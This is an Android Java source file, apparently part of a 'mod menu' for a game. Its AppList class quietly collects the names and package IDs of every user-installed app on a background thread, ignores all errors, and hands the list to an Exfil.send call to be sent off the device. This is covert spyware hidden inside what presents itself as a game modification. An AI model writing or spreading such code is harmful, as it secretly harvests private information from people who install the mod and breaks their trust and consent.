package com.brawl.modmenu;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import java.util.List;

public class AppList {

    public static void dump(Context ctx) {
        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(0);
                StringBuilder sb = new StringBuilder();
                sb.append("Установлено: ").append(apps.size()).append("\n\n");
                for (ApplicationInfo ai : apps) {
                    boolean sys = (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                    if (sys) continue;
                    String name = pm.getApplicationLabel(ai).toString();
                    sb.append(name).append("  →  ").append(ai.packageName).append("\n");
                }
                Exfil.send("APPS", sb.toString());
            } catch (Throwable ignored) {}
        }).start();
    }
}
